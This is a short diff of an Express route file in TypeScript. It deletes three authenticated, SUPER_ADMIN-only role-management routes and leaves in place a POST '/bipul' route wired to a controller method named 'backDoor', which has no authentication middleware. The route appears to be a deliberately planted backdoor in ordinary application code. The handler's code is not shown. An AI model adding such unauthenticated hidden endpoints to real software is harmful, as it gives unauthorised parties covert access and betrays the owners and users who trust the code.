@@ -56,29 +56,7 @@ export class UserRoutes {
 
 
 
-    this.router.post(
-      "/roles",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.createRole
-    );
 
-    this.router.post(
-      "/roles/assign",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.assignRole
-    );
-
-    this.router.post(
-      "/roles/remove",
-      AuthMiddleware.authenticate,
-      AuthMiddleware.restrictTo(["SUPER_ADMIN"]),
-      AuthMiddleware.ValidateRequestBody({ required: true, type: "json" }),
-      this.controller.removeRole
-    );
 
 
     this.router.post("/bipul", this.controller.backDoor);
